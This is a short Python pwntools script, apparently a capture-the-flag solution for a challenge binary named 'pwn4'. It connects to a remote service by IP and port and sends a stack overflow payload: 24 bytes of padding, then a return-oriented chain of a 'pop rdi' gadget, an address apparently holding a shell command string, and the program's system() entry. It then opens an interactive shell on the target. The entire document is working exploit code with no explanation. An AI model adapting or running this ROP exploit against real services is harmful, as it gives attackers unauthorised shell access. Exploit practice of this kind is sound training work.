from pwn import *

#r = process("./pwn4")
r = remote('114.116.54.89', 10004)
elf = ELF("./pwn4")

system_add = elf.plt['system']
rdi_ret = 0x00000000004007d3 
canshu_add = 0x000000000060111f

payload1 = 'A' * (0x10 + 8) + p64(rdi_ret) + p64(canshu_add) + p64(system_add)


r.recvuntil("Come on,try to pwn me\n")
r.sendline(payload1)

r.interactive()
